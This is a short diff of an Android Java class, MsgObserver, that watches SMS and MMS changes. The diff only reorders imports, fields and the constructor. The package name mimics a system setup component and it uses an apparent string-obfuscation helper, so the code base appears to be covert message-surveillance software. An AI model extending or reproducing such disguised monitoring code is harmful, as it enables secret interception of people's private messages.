@@ -1,34 +1,23 @@
 package com.android.syssetup.module.message;
 
-import java.util.ArrayList;
-import java.util.Iterator;
-
 import android.content.ContentResolver;
 import android.database.ContentObserver;
 import android.os.Handler;
 import android.os.Handler.Callback;
 import android.os.Message;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.manager.ManagerModule;
 import com.android.syssetup.module.ModuleMessage;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
+
+import java.util.ArrayList;
+import java.util.Iterator;
 
 public class MsgObserver extends ContentObserver implements Runnable {
 	private static final String TAG = "MsgObserver"; //$NON-NLS-1$
-	private boolean mmsEnabled;
-	private boolean smsEnabled;
-
-	private long changeDelay = 5000;
-
-	public MsgObserver(Handler handler, boolean mmsEnabled, boolean smsEnabled) {
-		super(handler);
-		this.mmsEnabled = mmsEnabled;
-		this.smsEnabled = smsEnabled;
-	}
-
 	final Handler h = new Handler(new Callback() {
 		@Override
 		public boolean handleMessage(Message msg) {
@@ -36,6 +25,15 @@ public class MsgObserver extends ContentObserver implements Runnable {
 			return false;
 		}
 	});
+	private boolean mmsEnabled;
+	private boolean smsEnabled;
+	private long changeDelay = 5000;
+
+	public MsgObserver(Handler handler, boolean mmsEnabled, boolean smsEnabled) {
+		super(handler);
+		this.mmsEnabled = mmsEnabled;
+		this.smsEnabled = smsEnabled;
+	}
 
 	@Override
 	public void onChange(boolean bSelfChange) {
